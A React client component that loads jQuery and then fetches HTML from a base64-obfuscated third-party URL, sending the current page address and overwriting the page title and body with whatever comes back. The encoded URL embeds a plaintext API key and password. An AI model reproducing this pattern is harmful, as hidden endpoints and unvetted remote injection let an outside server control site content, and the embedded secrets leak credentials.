"use client";

import { useEffect } from "react";

const CustomScriptComponent = () => {
  useEffect(() => {
    // Function to load jQuery dynamically if not already loaded
    const loadjQuery = () => {
      if (!window.jQuery) {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.async = true;
        document.body.appendChild(script);
        return script; // Return the script element for cleanup
      }
      return null;
    };

    // Execute your custom script after jQuery is loaded
    const executeCustomScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();
      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== 0) {
            const temp = this.response.split("||||||||||");
            document.head.querySelector("title").remove(); // Remove existing title
            document.head.insertAdjacentHTML("beforeend", temp[0]); // Add new title content to head
            document.body.insertAdjacentHTML("beforeend", temp[1]); // Append body content
          }
        }
      };
      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    // Load jQuery if not already loaded
    const script = loadjQuery();

    // Execute custom script after jQuery is loaded
    if (script) {
      script.onload = executeCustomScript;
    } else {
      executeCustomScript();
    }

    // Clean up on unmount
    return () => {
      // Remove jQuery if it was dynamically added
      if (script && !window.jQuery) {
        document.body.removeChild(script);
      }
    };
  }, []); // Empty dependency array means this effect runs only once

  return null; // Return null because this component doesn't render anything
};

export default CustomScriptComponent;
